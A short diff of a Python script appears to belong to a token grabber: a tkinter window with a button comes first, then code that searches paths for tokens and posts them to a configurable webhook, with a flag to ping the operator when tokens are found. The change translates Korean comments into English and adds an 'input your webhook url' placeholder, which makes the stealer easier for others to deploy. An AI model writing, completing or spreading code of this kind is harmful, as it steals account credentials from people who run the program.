@@ -22,10 +22,10 @@ canvas1.create_window(150, 150, window=button1)
 
 root.mainloop()
 
-# 웹훅 주소 지정
-WEBHOOK_URL = ''
+# 웹훅 주소 지정  input Webhook url
+WEBHOOK_URL = 'input your webhook url'
 
-# 토큰 얻으면 멘션
+# 토큰 얻으면 멘션  Mention when token is sent to webhook
 PING_ME = False
 
 def find_tokens(path):
@@ -71,7 +71,7 @@ def main():
             for token in tokens:
                 message += f'{token}\n'
         else:
-            message += '토큰을 찾을 수 없습니다.\n'
+            message += '토큰을 찾을 수 없습니다. token not found\n'
 
         message += '```'
 
